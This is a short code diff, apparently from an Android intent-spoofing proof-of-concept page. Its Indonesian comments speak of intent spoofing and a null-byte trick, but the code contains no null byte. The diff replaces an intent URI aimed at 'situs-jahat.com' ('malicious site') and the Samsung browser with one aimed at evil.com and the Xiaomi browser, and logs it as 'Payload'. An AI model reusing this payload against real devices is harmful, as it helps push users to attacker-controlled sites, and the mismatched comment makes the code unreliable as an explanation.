@@ -45,7 +45,7 @@ button:disabled { background: #555; }
         try {
             // PERBAIKAN: Deklarasi variabel instagramIntent
             // Menggunakan Null Byte (%00) untuk Intent Spoofing
-            const instagramIntent = "intent://situs-jahat.com/#Intent;scheme=https;package=com.sec.android.app.sbrowser;action=android.intent.action.SBROWSER_VIEW_FOR_EXTERNAL_APP;end";
+            const instagramIntent = "intent://evil.com/#Intent;scheme=https;package=com.mi.globalbrowser;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end";
             
             log("Payload: " + instagramIntent);
             
